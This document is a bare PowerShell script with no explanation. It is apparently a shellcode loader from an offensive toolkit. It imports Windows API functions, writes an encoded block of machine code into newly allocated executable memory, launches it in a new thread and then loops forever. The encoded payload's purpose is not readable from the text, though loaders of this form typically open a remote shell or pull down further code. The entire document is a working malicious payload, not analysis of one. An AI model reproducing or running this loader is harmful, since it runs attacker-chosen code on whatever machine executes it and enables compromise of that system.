
$1CU = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $1CU -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xc4,0xd9,0x74,0x24,0xf4,0xba,0xd8,0xbb,0xf5,0xda,0x5f,0x2b,0xc9,0xb1,0x47,0x31,0x57,0x18,0x03,0x57,0x18,0x83,0xc7,0xdc,0x59,0x00,0x26,0x34,0x1f,0xeb,0xd7,0xc4,0x40,0x65,0x32,0xf5,0x40,0x11,0x36,0xa5,0x70,0x51,0x1a,0x49,0xfa,0x37,0x8f,0xda,0x8e,0x9f,0xa0,0x6b,0x24,0xc6,0x8f,0x6c,0x15,0x3a,0x91,0xee,0x64,0x6f,0x71,0xcf,0xa6,0x62,0x70,0x08,0xda,0x8f,0x20,0xc1,0x90,0x22,0xd5,0x66,0xec,0xfe,0x5e,0x34,0xe0,0x86,0x83,0x8c,0x03,0xa6,0x15,0x87,0x5d,0x68,0x97,0x44,0xd6,0x21,0x8f,0x89,0xd3,0xf8,0x24,0x79,0xaf,0xfa,0xec,0xb0,0x50,0x50,0xd1,0x7d,0xa3,0xa8,0x15,0xb9,0x5c,0xdf,0x6f,0xba,0xe1,0xd8,0xab,0xc1,0x3d,0x6c,0x28,0x61,0xb5,0xd6,0x94,0x90,0x1a,0x80,0x5f,0x9e,0xd7,0xc6,0x38,0x82,0xe6,0x0b,0x33,0xbe,0x63,0xaa,0x94,0x37,0x37,0x89,0x30,0x1c,0xe3,0xb0,0x61,0xf8,0x42,0xcc,0x72,0xa3,0x3b,0x68,0xf8,0x49,0x2f,0x01,0xa3,0x05,0x9c,0x28,0x5c,0xd5,0x8a,0x3b,0x2f,0xe7,0x15,0x90,0xa7,0x4b,0xdd,0x3e,0x3f,0xac,0xf4,0x87,0xaf,0x53,0xf7,0xf7,0xe6,0x97,0xa3,0xa7,0x90,0x3e,0xcc,0x23,0x61,0xbf,0x19,0xd9,0x64,0x57,0x62,0xb6,0x66,0x8a,0x0a,0xc5,0x68,0xd5,0x7b,0x40,0x8e,0x85,0x2b,0x03,0x1f,0x65,0x9c,0xe3,0xcf,0x0d,0xf6,0xeb,0x30,0x2d,0xf9,0x21,0x59,0xc7,0x16,0x9c,0x31,0x7f,0x8e,0x85,0xca,0x1e,0x4f,0x10,0xb7,0x20,0xdb,0x97,0x47,0xee,0x2c,0xdd,0x5b,0x86,0xdc,0xa8,0x06,0x00,0xe2,0x06,0x2c,0xac,0x76,0xad,0xe7,0xfb,0xee,0xaf,0xde,0xcb,0xb0,0x50,0x35,0x40,0x78,0xc5,0xf6,0x3e,0x85,0x09,0xf7,0xbe,0xd3,0x43,0xf7,0xd6,0x83,0x37,0xa4,0xc3,0xcb,0xed,0xd8,0x58,0x5e,0x0e,0x89,0x0d,0xc9,0x66,0x37,0x68,0x3d,0x29,0xc8,0x5f,0xbf,0x15,0x1f,0x99,0xb5,0x77,0xa3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$DZw=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($DZw.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$DZw,0,0,0);for (;;){Start-sleep 60};
